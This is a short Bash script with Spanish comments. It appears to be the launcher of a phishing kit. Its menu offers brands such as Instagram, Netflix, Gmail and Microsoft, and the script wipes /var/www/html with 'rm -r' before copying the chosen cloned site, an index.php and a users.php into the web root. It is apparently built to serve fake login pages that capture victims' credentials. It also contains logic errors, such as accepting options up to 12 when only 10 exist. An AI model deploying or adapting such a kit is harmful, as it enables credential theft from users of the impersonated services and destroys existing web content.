#!/bin/bash
echo "[1]. Instagram    [2]. LinkedIn    [3]. Discord"
echo "[4]. Netflix      [5]. Yahoo       [6]. Dropbox"
echo "[7]. Ebay         [8]. Github      [9]. Microsoft"
echo "[10]. Gmail"
echo "[0]. Salir"
#Magenta
echo -e "\e[35m"
read -p "Seleccione una opcion: " opcion
echo -e "\e[0m"

#Guarda las palabras en un array

declare -a paginas=('instagram' 'linkedin' 'discord' 'netflix' 'yahoo' 'dropbox' 'ebay' 'github' 'microsoft' 'gmail');

#Si la opción es del 1 al 12, comhtml que el archivo index.php está en /var/www/html/
#Si está no se hace nada, si NO está se copia a /var/html/www/

if [ $opcion -eq 0 ]; then
    ./install.sh
fi

while [ -z $opcion ] || [ $opcion -lt 1 ] || [ $opcion -gt 12 ]
do
    echo "Opcion incorrecta"
    read -p "Seleccione una opcion: " opcion
done

if [ $opcion -ge 1 ] && [ $opcion -le 12 ]; then
    num_pagina=$(($opcion-1))
    echo -e "\e[35m Copiando a /var/www/html/${paginas[$num_pagina]} \e[0m"
    #Eliminar el contenido de html.
    rm -r /var/www/html
    #Añadir el contenido de la página.
    cp -r webs/${paginas[$num_pagina]} /var/www/
    mv /var/www/${paginas[$num_pagina]} /var/www/html
    #Comprobar si el archivo php está en /var/www/html/
    if [ -f /var/www/html/index.php ]; then
        echo -e "\e[32m El archivo index.php ya existe. \e[0m"
        #Añade un salto de linea
        echo ""
    else
        #En rojo.
        echo -e "\e[31m El archivo index.php no existe. \e[0m"
        echo -e "\e[35m Copiando archivo index.php a /var/www/html/ \e[0m"
        cp webs/index.php /var/www/html/
        echo -e "\e[32m Copiando archivo users.php a /var/www/html/ \e[0m"
        cp webs/users.php /var/www/html/
        if [ -d /var/www/html/index.php ]; then
            echo -e "\e[31m Copiado index.php a /var/www/html/ \e[0m"
        fi
    fi
fi
./config.sh
